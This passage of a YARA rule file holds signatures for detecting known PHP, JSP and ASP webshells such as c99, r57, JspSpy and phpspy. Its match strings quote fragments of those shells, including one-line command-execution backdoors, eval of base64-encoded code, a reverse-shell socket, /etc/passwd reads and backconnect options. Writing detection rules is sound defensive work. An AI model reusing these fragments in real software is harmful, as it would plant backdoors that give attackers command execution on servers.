	$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
condition:
	all of them
}
rule Php_Webshell_webshell_r57_1_4_0
{
strings:
	$s4 = "@ini_set('error_log',NULL);" fullword
	$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
	$s7 = "@ini_restore(\"disable_functions\");" fullword
	$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_hsxa1
{
strings:
	$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_ajn
{
strings:
	$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
	$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
condition:
	all of them
}
rule Php_Webshell_webshell_php_cmd
{
strings:
	$s0 = "if($_GET['cmd']) {" fullword
	$s1 = "// cmd.php = Command Execution" fullword
	$s7 = "  system($_GET['cmd']);" fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_list
{
strings:
	$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
	$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_co
{
strings:
	$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
	$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_150
{
strings:
	$s0 = "HJ3HjqxclkZfp"
	$s1 = "<? eval(gzinflate(base64_decode('" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_cmdjsp_2
{
strings:
	$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
	$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_c37
{
strings:
	$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
	$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_b37
{
strings:
	$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
condition:
	all of them
}
rule Php_Webshell_webshell_php_backdoor
{
strings:
	$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
	$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_dabao
{
strings:
	$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
	$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
condition:
	all of them
}
rule Php_Webshell_webshell_php_2
{
strings:
	$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_cmdasp
{
strings:
	$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_spjspshell
{
strings:
	$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_action
{
strings:
	$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
	$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_Inderxer
{
strings:
	$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_Rader
{
strings:
	$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
	$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
condition:
	all of them
}
rule Php_Webshell_webshell_c99_madnet_smowu
{
strings:
	$s0 = "//Authentication" fullword
	$s1 = "$login = \"" fullword
	$s2 = "eval(gzinflate(base64_decode('"
	$s4 = "//Pass"
	$s5 = "$md5_pass = \""
	$s6 = "//If no pass then hash"
condition:
	all of them
}
rule Php_Webshell_webshell_php_moon
{
strings:
	$s2 = "echo '<option value=\"create function backshell returns string soname"
	$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
	$s8 = "echo '<option value=\"select cmdshell(\\'net user "
condition:
	2 of them
}
rule Jsp_Webshell_webshell_jsp_jdbc
{
strings:
	$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
	all of them
}
rule Php_Webshell_webshell_minupload
{
strings:
	$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
	$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
condition:
	all of them
}
rule Php_Webshell_webshell_ELMALISEKER_Backd00r
{
strings:
	$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
	$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_bug_1_
{
strings:
	$s0 = "@include($_GET['bug']);" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_caidao_shell_hkmjj
{
strings:
	$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_asd
{
strings:
	$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
	$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_inback3
{
strings:
	$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
condition:
	all of them
}
rule Php_Webshell_webshell_metaslsoft
{
strings:
	$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_Ajan
{
strings:
	$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
condition:
	all of them
}
rule Php_Webshell_webshell_config_myxx_zend
{
strings:
	$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
condition:
	all of them
}
rule Php_Webshell_webshell_browser_201_3_ma_download
{
strings:
	$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
	$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
condition:
	all of them
}
rule Php_Webshell_webshell_itsec_itsecteam_shell_jHn
{
strings:
	$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
	$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
condition:
	all of them
}
rule Php_Webshell_webshell_ghost_source_icesword_silic
{
strings:
	$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
	$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
condition:
	all of them
}
rule Jsp_Webshell_webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx
{
strings:
	$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
	$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
condition:
	all of them
}
rule Php_Webshell_webshell_2_520_job_ma1_ma4_2
{
strings:
	$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
	$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
condition:
	all of them
}
rule Jsp_Webshell_webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx
{
strings:
	$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
	$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_wso2_5_1_wso2_5_wso2
{
strings:
	$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
	$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
condition:
	all of them
}
rule Jsp_Webshell_webshell_000_403_c5_queryDong_spyjsp2010_t00ls
{
strings:
	$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
	$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
condition:
	all of them
}
rule Php_Webshell_webshell_404_data_suiyue
{
strings:
	$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
condition:
	all of them
}
rule Php_Webshell_webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx
{
strings:
	$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
	$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
	$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
condition:
	all of them
}
rule Jsp_Webshell_webshell_807_a_css_dm_he1p_JspSpy_xxx
{
strings:
	$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
	$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
	$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
condition:
	all of them
}
rule Php_Webshell_webshell_201_3_ma_download
{
strings:
	$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
	$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
	$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
condition:
	all of them
}
rule Jsp_Webshell_webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download
{
strings:
	$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
	$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_shell_phpspy_2006_arabicspy
{
strings:
	$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
	$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
condition:
	all of them
}
rule Jsp_Webshell_webshell_in_JFolder_jfolder01_jsp_leo_warn
{
strings:
	$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
	$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
condition:
	all of them
}
rule Php_Webshell_webshell_2_520_icesword_job_ma1_ma4_2
{
strings:
	$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
	$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
	$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
condition:
	all of them
}
rule Php_Webshell_webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY
{
strings:
	$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
	$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
	$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
condition:
	2 of them
}
rule Php_Webshell_webshell_shell_phpspy_2006_arabicspy_hkrkoz
{
strings:
	$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
condition:
	all of them
}
rule Php_Webshell_webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx
{
strings:
	$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
condition:
	all of them
}
rule Php_Webshell_webshell_2008_2009lite_2009mssql
{
strings:
	$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
	$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
condition:
	all of them
}
rule Php_Webshell_webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz
{
strings:
	$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
	$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
condition:
	all of them
}
rule Jsp_Webshell_webshell_807_dm_JspSpyJDK5_m_cofigrue
{
strings:
	$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
	$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx
{
strings:
	$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
	$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_404_data_in_JFolder_jfolder01_xxx
{
strings:
	$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_reverse_jsp_reverse_jspbd
{
strings:
	$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
	$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
	$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc
{
strings:
	$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
	$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
	$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
	$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
condition:
	2 of them
}
rule Jsp_Webshell_webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2
{
strings:
	$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
	$s6 = "password = (String)session.getAttribute(\"password\");" fullword
	$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
condition:
	2 of them
}
rule Php_Webshell_webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz
{
strings:
	$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
	$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
	$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
	$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
	$fn = "filename: backup"
condition:
	2 of ($s*) and not $fn
}
rule Php_Webshell_webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx
{
strings:
	$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
	$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
condition:
	all of them
}
rule Php_Webshell_webshell_itsec_PHPJackal_itsecteam_shell_jHn
{
strings:
	$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
	$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
	$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
condition:
	2 of them
}
rule Php_Webshell_webshell_Shell_ci_Biz_was_here_c100_v_xxx
{
strings:
	$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
	$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
	$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
	$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
	$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
condition:
	2 of them
}
rule Php_Webshell_webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1
{
strings:
	$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
	$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
	$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
	$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_c99_c99shell_c99_w4cking_Shell_xxx
{
strings:
	$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
	$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
	$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
	$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
	$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
	$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
condition:
	2 of them
}
rule Php_Webshell_webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz
{
strings:
	$s0 = "$this -> addFile($content, $filename);" fullword
	$s3 = "function addFile($data, $name, $time = 0) {" fullword
	$s8 = "function unix2DosTime($unixtime = 0) {" fullword
	$s9 = "foreach($filelist as $filename){" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_c99_c66_c99_shadows_mod_c99shell
{
strings:
	$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
	$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
	$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
	$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
	$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
	$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
condition:
	2 of them
}
rule Jsp_Webshell_webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1
{
strings:
	$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
	$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
	$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
	$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
condition:
	2 of them
}
rule Jsp_Webshell_webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend
{
strings:
	$s0 = "return new Double(format.format(value)).doubleValue();" fullword
	$s5 = "File tempF = new File(savePath);" fullword
	$s9 = "if (tempF.isDirectory()) {" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_c99_c99shell_c99_c99shell
{
strings:
	$s2 = "$bindport_pass = \"c99\";" fullword
	$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
condition:
	1 of them
}
rule Php_Webshell_webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat
{
strings:
	$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
	$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
	$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
	$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx
{
strings:
	$s3 = "BODY, TD, TR {" fullword
	$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
	$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_000_403_807_a_c5_config_css_dm_he1p_xxx
{
strings:
	$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
	$s4 = "URL downUrl = new URL(downFileUrl);" fullword
	$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
	$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
	$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
	$s8 = "URLConnection conn = downUrl.openConnection();" fullword
	$s9 = "sis = request.getInputStream();" fullword
condition:
	4 of them
}
rule Php_Webshell_webshell_2_520_icesword_job_ma1
{
strings:
	$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
	$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
	$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
condition:
	2 of them
}
rule Jsp_Webshell_webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn
{
strings:
	$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
	$s2 = " KB </td>" fullword
	$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
	$s4 = "<!-- <tr align=\"center\"> " fullword
condition:
	all of them
}
rule Php_Webshell_webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY
{
strings:
	$s4 = "http://www.4ngel.net" fullword
	$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
	$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
	$s9 = "Codz by Angel" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_c99_locus7s_c99_w4cking_xxx
{
strings:
	$s1 = "$res = @shell_exec($cfe);" fullword
	$s8 = "$res = @ob_get_contents();" fullword
	$s9 = "@exec($cfe,$res);" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_browser_201_3_ma_ma2_download
{
strings:
	$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
	$s2 = "private static String tempdir = \".\";" fullword
	$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
condition:
	2 of them
}
rule Jsp_Webshell_webshell_000_403_c5_queryDong_spyjsp2010
{
strings:
	$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
	$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
	$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
	$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_r57shell127_r57_kartal_r57
{
strings:
	$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
	$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
	$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
condition:
	2 of them
}
rule Php_Webshell_webshell_webshells_new_con2
{
strings:
	$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
	$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_make2
{
strings:
	$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
condition:
	all of them
}
rule Php_Webshell_webshell_webshells_new_aaa
{
strings:
	$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
	$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
	$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
condition:
	1 of them
}
rule Asp_Webshell_webshell_Expdoor_com_ASP
{
strings:
	$s4 = "\">www.Expdoor.com</a>" fullword
	$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
	$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
	$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
	$s16 = "<TITLE>Expdoor.com ASP" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_webshells_new_php2
{
strings:
	$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
condition:
	all of them
}
rule Php_Webshell_webshell_bypass_iisuser_p
{
strings:
	$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
condition:
	all of them
}
rule Php_Webshell_webshell_sig_404super
{
strings:
	$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
	$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
	$s7 = "//http://require.duapp.com/session.php" fullword
	$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
	$s12 = "//define('pass','123456');" fullword
	$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
condition:
	1 of them
}
rule Jsp_Webshell_webshell_webshells_new_JSP
{
strings:
	$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
	$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
	$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
condition:
	1 of them
}
rule Php_Webshell_webshell_webshell_123
{
strings:
	$s0 = "// Web Shell!!" fullword
	$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
	$s3 = "$default_charset = \"UTF-8\";" fullword
	$s4 = "// url:http://www.weigongkai.com/shell/" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_dev_core
{
strings:
	$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
	$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
	$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
	$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
	$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
	$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_pHp
{
strings:
	$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
	$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
	$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
	$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
	$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_pppp
{
strings:
	$s0 = "Mail: chinese@hackermail.com" fullword
	$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
	$s6 = "Site: http://blog.weili.me" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_code
{
strings:
	$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
